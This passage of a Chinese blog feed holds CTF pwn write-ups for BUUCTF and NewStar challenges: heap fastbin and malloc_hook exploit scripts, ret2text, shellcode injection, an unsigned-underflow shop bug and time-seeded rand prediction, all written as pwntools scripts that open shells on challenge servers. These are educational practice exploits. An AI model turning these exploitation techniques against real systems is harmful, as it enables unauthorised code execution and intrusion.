class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>paylaod3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>paylaod3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#edit(0,len(p64(system_add)),p64(system_add))</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#p.recv()</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/27/pPbZyLD.md.png\" alt=\"\" /></p>\n<pre><code>.\n.\n.\n.\n</code></pre>\n<p>第一开始失败的脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28377</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">creat</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap : \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#def dump(index):</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Command: \",\"4\")</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Index: \",str(index))</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#creat(0x10)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#allocate(0x10)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#allocate(0x80)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#free(2)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x6020ad</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">19</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>payloda2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4869\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#payload1=p64(0)*2+p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#fill(0,len(payload1),payload1)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#payload2=p64(0)*3+p64(0x21)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#fill(3,len(payload2),payload2)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">#allocate(0x10)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#allocate(0x10)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#payload3=p64(0)*3+p64(0x91)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#fill(3,len(payload3),payload3)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#allocate(0x80)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#free(4)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#dump(2)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#main_arena_88=u64(p.recvuntil(b'\\x7f')[-6:]+b'\\x00\\x00')</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#libc_base=main_arena_88-0x3c4b78 </span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">#5</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#fake_chunk= libc_base+0x3c4aed </span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">#6</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token comment\">#allocate (0x60) #回收一部分 chunk4</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token comment\">#free (4)  #使 chunk4 进入 fastbin 中</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\">#payload4=p64 (fake_chunk)  #改写 chunk4 的 fd 使 fake_chunk 进入 fastbin</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">#fill(2,len(payload4),payload4)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token comment\">#7</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\">#allocate (0x60)  #index4，分配 chunk4</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#allocate (0x60)  #index5，分配 fake_chunk</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\">#因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token comment\">#所以 malloc_hook=fake_chunk+0x23 (fake_chunk+0x33-0x10)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\">#payload5=p64(0)+p64(0)+p8(0)*3  #0x13</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\">#payload5+=p64 (libc_base+0x4526a)  #0x4526a 由 one_gadget 查找得到</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\">#fill(6,len(payload5),payload5)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\">#allocate (0x60)               #index6, 执行一次就会执行 malloc_hook，就可以 getshell</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/newstar/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/newstar/",
            "title": "newstart（pwn）",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"1ret2text\"><a class=\"anchor\" href=\"#1ret2text\">#</a> 1.ret2text</h1>\n<p>64 位程序，开启了 NX，明显的栈溢出</p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/25/AnOpVloO.png\" alt=\"\" /></p>\n<p>有后门字符串</p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/25/EiN1L3If.png\" alt=\"\" /></p>\n<p>点进去，然后按住 &quot;ctrl +x&quot; 转移到后门函数</p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/25/w66BFWqE.png\" alt=\"\" /></p>\n<p>要执行 execve (&quot;/bin/sh&quot;,0,0)<br />\n 直接利用</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ret2text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"magic\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00004011FB</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#溢出 40 个字符串</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>本地：<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/25/P7PsBat1.png\" alt=\"\" /></p>\n<p>远程：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pP7zHBV.png\" alt=\"\" /></p>\n<h1 id=\"2ezshellcode\"><a class=\"anchor\" href=\"#2ezshellcode\">#</a> 2.ezshellcode</h1>\n<p>64 位程序，开启了 nx，由于该题目已经说明了用 shellcode，我们需要绕过 NX</p>\n<p>IDA 查看</p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/25/vYANijeZ.png\" alt=\"\" /><br />\n发现有 <code>mmap</code>  函数，它开辟了一个可执行地址，返回值就是该地址</p>\n<p>所以 buf 上可执行在这注入我们的 shellcode，后面又有一个 jump 跳转到该地址就会执行我们写入的 shellcode</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ezshellcode'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"magic\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload1<span class=\"token operator\">=</span>shellcode</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/26/pP7zONF.png\" alt=\"\" /></p>\n<h1 id=\"3newstar_shop\"><a class=\"anchor\" href=\"#3newstar_shop\">#</a> 3.newstar_shop</h1>\n<p>64 位程序，保护全开</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP7H5lT.png\" alt=\"\" /></p>\n<p>在 <code>shop</code>  函数中有后门，但是需要我们让 money&gt;0x270E</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP7H7m4.png\" alt=\"\" /></p>\n<p>看一下初始 <code>money</code>  的大小，发现 <code>money=64h</code> （100）， <code>chance=1</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/25/pP7blAs.png\" alt=\"\" /></p>\n<p>但是我们发现 <code>money</code>  是 <code>unsigned int</code>  类型，最小值为 0， <code>0-1</code>  后这个值会变到最大，所以想办法减少这个值</p>\n<p>在 <code>shop</code>  函数中由于会先判断 money 的大小才减去，所以不能直接用</p>\n<p>发现在 <code>dont_try</code>  函数会减 50，由于 <code>chance是1</code> ，所以只会减一次，那么我们需要在 <code>shop</code>  函数里先消耗掉一部分<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/25/pP7bung.md.png\" alt=\"\" /></p>\n<p>最终办法：</p>\n<ol>\n<li>在 <code>shop</code>  中消耗 80（在商店中选两次减 40 的）</li>\n<li>进入 dont_try 消耗 50</li>\n<li>购买 shell</li>\n</ol>\n<p>直接 nc 连接：</p>\n<ol>\n<li>输入 1，进入商店，输入 2 ，花费 40</li>\n<li>再次输入 1，进入商店，输入 2，花费 40</li>\n<li>输入 3，进入 Don't choose，扣除 50，这时 money 的值就会很大</li>\n<li>输入 1，然后输入 3 来 getshell</li>\n</ol>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHS9nx.png\" alt=\"\" /></p>\n<h1 id=\"4random\"><a class=\"anchor\" href=\"#4random\">#</a> 4.Random</h1>\n<p>64 位程序，保护全开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pP7bWHH.png\" alt=\"\" /></p>\n<p>sy 函数中有后门<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pP7bhEd.md.png\" alt=\"\" /></p>\n<p>发现只有让我们输入的值与随机数相同就能进入后门中，不过后门中也是通过随机数来传参，那么我们就需要多试几次即可</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pP7b7gf.png\" alt=\"\" /></p>\n<p>随机数是伪随机，通过种子函数来产生值，可以利用 <code>ctpye</code>  库来构造 c 函数的 <code>srand</code>  函数</p>\n<p>【ctypes 是 Python 内建的用于调用动态链接库函数的功能模块，一定程度上可以用于 Python 与其他语言的混合编程。由于编写动态链接库，使用 C/C<ins> 是最常见的方式，故 ctypes 最常用于 Python 与 C/C</ins> 混合编程之中。<br />\nrand 函数要用 cdll 中的函数。】</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#自己会加载这个库</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#以 time (0) 为随机数种子</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>num<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#产生随机数，转成字符型</span></pre></td></tr></table></figure><p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context(os='linux', arch='amd64', log_level='debug')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p = process('./pwn')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28504</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'number?\\n'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHKuWR.png\" alt=\"\" /></p>\n<h1 id=\"5\"><a class=\"anchor\" href=\"#5\">#</a> 5.</h1>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/mrctf2020_shellcode/",
            "url": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/mrctf2020_shellcode/",
            "title": "mrctf2020_shellcode（DynELF）",
            "date_published": "2023-09-23T09:08:15.000Z",
            "content_html": "<h1 id=\"1查看程序信息\"><a class=\"anchor\" href=\"#1查看程序信息\">#</a> 1. 查看程序信息</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/24/pP7iern.png\" alt=\"\" /><br />\n64 位程序，发现开启了 PIE</p>\n<p>利用 ida 查看一下<br />\n发现转 c 语言失败，那就分析汇编<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7iJM9.png\" alt=\"\" /></p>\n<p>可以看到 buf 有 0x410 的大小，而输入只有 0x400，无法溢出<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7FTfO.png\" alt=\"\" /></p>\n<h1 id=\"2分析汇编\"><a class=\"anchor\" href=\"#2分析汇编\">#</a> 2. 分析汇编</h1>\n<p>这里解释汇编代码的含义<br />\n首先要了解 <code>jg</code>  命令的含义</p>\n<pre><code>jg：比较结果是&quot;&gt;&quot;则跳转，所以我们需要查看前面的 cmp的比较结果\n</code></pre>\n<p>read 函数的返回值是输入值的大小并且会保存到 eax 中<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7A3RS.png\" alt=\"\" /></p>\n<p>输入 shellcode 后会满足长度判断，使跳转到 <code>loc_11D6</code></p>\n<p>LEA 指令的作用是取 opera2 的地址，然后把这个地址赋给 opera1</p>\n<pre><code>lea rax ,[rbp+buf]  //LEA指令此处取 栈顶(rbp+buf) 的地址 ,来给rax \n</code></pre>\n<p>call 指令会进行跳转，意味着就跳转到栈顶然后执行<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7AIzD.md.png\" alt=\"\" /></p>\n<p>这就很明了了，我们直接输入 <code>shellcode</code>  然后长度可以进行跳转，并且 <code>call</code>  又会去再 <code>shellcode</code>  起始处，也就是栈顶执行我们输入的 <code>shellcode</code> , 这样就直接获得 shell 了</p>\n<h1 